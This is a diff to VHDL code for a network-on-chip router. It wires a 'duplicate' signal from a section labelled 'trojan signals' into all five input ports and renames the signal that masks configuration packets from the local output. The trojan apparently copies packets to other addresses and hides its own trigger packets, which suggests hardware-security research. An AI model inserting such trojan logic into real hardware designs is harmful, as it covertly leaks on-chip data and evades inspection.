@@ -66,11 +66,10 @@ signal mux_in, mux_out: arrayNport_reg3 := (others=>(others=>'0'));
 signal free: regNport := (others=>'0');
 
 -- trojan signals
-signal duplicate, dataSel, data_ack_local, maskPckt, data_ack_dup, data_av_local, duplicating: std_logic := '0';
+signal duplicate, data_ack_local, n_maskPckt, data_ack_dup, data_av_local, duplicating: std_logic := '0';
 signal configPckt, turnOff, txCrossbar : regNport := (others=>'0');
-signal dupHeader, dupFlit : regflit := (others=>'0');
+signal dupFlit : regflit := (others=>'0');
 signal destAddr : arrayNport_regmetadeflit := (others=>(others=>'0'));
-signal dest : regmetadeflit := (others=>'0');
 signal mux_dup : regNport := (others=>'0');
 
 begin
@@ -81,6 +80,7 @@ begin
 		reset => reset,
 		configPckt => configPckt(0),
 		turnOff => turnOff(0),
+		duplicate => duplicate,
 		destAddr => destAddr(0),
 		address => address,
 		data_in => data_in(0),
@@ -100,6 +100,7 @@ begin
 		reset => reset,
 		configPckt => configPckt(1),
 		turnOff => turnOff(1),
+		duplicate => duplicate,
 		destAddr => destAddr(1),
 		address => address,
 		data_in => data_in(1),
@@ -119,6 +120,7 @@ begin
 		reset => reset,
 		configPckt => configPckt(2),
 		turnOff => turnOff(2),
+		duplicate => duplicate,		
 		destAddr => destAddr(2),
 		address => address,
 		data_in => data_in(2),
@@ -138,6 +140,7 @@ begin
 		reset => reset,
 		configPckt => configPckt(3),
 		turnOff => turnOff(3),
+		duplicate => duplicate,
 		destAddr => destAddr(3),
 		address => address,
 		data_in => data_in(3),
@@ -157,6 +160,7 @@ begin
 		reset => reset,
 		configPckt => configPckt(4),
 		turnOff => turnOff(4),
+		duplicate => duplicate,
 		destAddr => destAddr(4),
 		address => address,
 		data_in => data_in(4),
@@ -220,7 +224,7 @@ begin
         dupFlit			=> dupFlit,
         duplicate 		=> duplicate,
         configPckt 		=> configPckt,
-      	maskPckt_o		=> maskPckt,
+      	n_maskPckt_o	=> n_maskPckt,
       	turnOff			=> turnOff
 	);
 
@@ -233,7 +237,7 @@ begin
 				  data_av_local;
 
 	-- To ofuscate the configuration packet
-	tx(LOCAL) <= txCrossbar(LOCAL) AND maskPckt;
+	tx(LOCAL) <= txCrossbar(LOCAL) AND n_maskPckt;
 	tx(EAST) <= txCrossbar(EAST);
 	tx(WEST) <= txCrossbar(WEST);
 	tx(SOUTH) <= txCrossbar(SOUTH);
